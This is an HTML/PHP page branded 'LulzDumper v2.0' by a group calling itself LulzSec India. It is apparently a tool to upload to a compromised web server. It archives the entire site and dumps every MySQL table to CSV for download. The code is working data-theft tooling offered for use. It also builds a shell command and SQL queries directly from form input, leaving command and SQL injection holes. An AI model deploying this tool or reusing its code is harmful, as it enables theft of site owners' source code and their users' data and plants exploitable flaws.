<!DOCTYPE html>
<html>
<head>
	<title>LulzDumper v2.0</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<link href="https://gitcdn.github.io/bootstrap-toggle/2.2.2/css/bootstrap-toggle.min.css" rel="stylesheet">
	<script src="https://gitcdn.github.io/bootstrap-toggle/2.2.2/js/bootstrap-toggle.min.js"></script>
	<style type="text/css">
		body {
			background: black;
			text-align: center;
			margin-left: 20px;
			margin-right: 20px;
			font-family: monospace;
			color: white;
		}
		label {
			margin-bottom: 10px;
			color: yellow;
		}
	</style>
	<script type="text/javascript">
		$("document").ready(function () {
			$("#db").fadeOut(0);
		})
		function lol() 
		{
			var r = document.getElementById("isdb");
			if(r.checked)
				$("#db").fadeIn();
			else
				$("#db").fadeOut();

		}
	</script>
</head>
<body>
	<pre style="color: red;font-weight: bolder;text-shadow: 0px 0px 6px blue;margin-bottom: 50px;">
 __         __  __     __         ______           _____     __  __     __    __     ______   ______     ______    
/\ \       /\ \/\ \   /\ \       /\___  \         /\  __-.  /\ \/\ \   /\ "-./  \   /\  == \ /\  ___\   /\  == \   
\ \ \____  \ \ \_\ \  \ \ \____  \/_/  /__        \ \ \/\ \ \ \ \_\ \  \ \ \-./\ \  \ \  _-/ \ \  __\   \ \  __<   
 \ \_____\  \ \_____\  \ \_____\   /\_____\        \ \____-  \ \_____\  \ \_\ \ \_\  \ \_\    \ \_____\  \ \_\ \_\ 
  \/_____/   \/_____/   \/_____/   \/_____/         \/____/   \/_____/   \/_/  \/_/   \/_/     \/_____/   \/_/ /_/ 
 _______________________________________________________
<span style="color:orange">Website zipping script || Brought You By : <font color="red">Lulz</font><font color="white">Sec</font><font color="green"> India</font><font color="cyan">
By T3r@bYt3</font></pre>
<center>
	<form class="form-veritical" style="width: 30%" method="post">
		<div class="form-group">
			<label>Zip Name</label>
			<input type="" name="z_name" class="form-control">
		</div>
		<div class="form-group">
			<label>Zip Password</label>
			<input type="" name="z_pass" class="form-control">
		</div>
		<div class="form-group">
			<label>MySQL Dump </label>
    		<input type="checkbox" data-toggle="toggle" data-on="yes" data-off="no" data-onstyle="success" data-offstyle="danger" name="dumpdb" id="isdb" onchange="lol()"?>
		</div>

		<div id="db">
			<div class="form-group">
				<label for="db_host">DB Hostname</label>
				<input type="" name="db_host" id="db_host" value="localhost" class="form-control">
			</div>
			<div class="form-group">
				<label for="db_user">DB Username</label>
				<input type="" name="db_user" id="db_user" class="form-control">
			</div>
			<div class="form-group">
				<label for="db_pass">DB Password</label>
				<input type="" name="db_pass" id="db_pass" class="form-control">
			</div>
			<div class="form-group">
				<label for="db_name">DB Name</label>
				<input type="" name="db_name" id="db_name" class="form-control">
			</div>

		</div>
		<div class="form-group">
			<input type="submit" name="submit" value="Dump Now" class="btn btn-info">
		</div>
		
	</form>

<?php
	if (isset($_POST['submit'])) {
		$zn = $_POST['z_name'];
		$zp = $_POST['z_pass'];
		if(isset($_POST['dumpdb']))
		{	
			$conn = new mysqli($_POST["db_host"], $_POST["db_user"], $_POST["db_pass"], $_POST["db_name"]);
			if($conn->connect_error)
				die($conn->connect_error);
			$getTables = "SHOW tables from $_POST[db_name]";
			$tables = [];
			mkdir("DatabaseDump__" . $_POST['db_name']);
			$result = $conn->query($getTables);
			if($result->num_rows > 0)
			{
				while($table = $result->fetch_assoc())
				{
					array_push($tables, $table["Tables_in_$_POST[db_name]"]);
				}
			}

			foreach ($tables as $table) {
				$cols = [];
				$getCols = "DESCRIBE $_POST[db_name].$table";
				$result = $conn->query($getCols);
				if($result->num_rows > 0)
				{
					while($col = $result->fetch_assoc())
					{
						array_push($cols, $col["Field"]);
					}
				}
				
				chdir("DatabaseDump__" . $_POST['db_name']);
				$fh = fopen($table . ".csv", "w");
				fwrite($fh, implode(",", $cols) . PHP_EOL);
				$getData = "SELECT * FROM $_POST[db_name].$table";
				$result = $conn->query($getData);
				if($result->num_rows > 0)
				{
					while($row = $result->fetch_array(MYSQLI_NUM))
					{
						fwrite($fh, implode(",", $row) . PHP_EOL);
					}
				}
				fclose($fh);
				chdir("..");
			}
			$conn->close();
		}
		$skip = end(explode("/", __FILE__));
		$cmd = $zp == "" ? "zip $zn -rq . -x " . $skip : "zip $zn -rq . -P $zp -x " . $skip;
		$code = system($cmd);
		if(file_exists($zn))
		{
			echo "<script>window.location='$zn';</script>";
			echo "<script>window.history.back();</script>";
		}
		else
		{
			echo "<script>alert('error while creating \"$zn\"')</script>";
		}
	}
?>
</center>
</body>
</html>
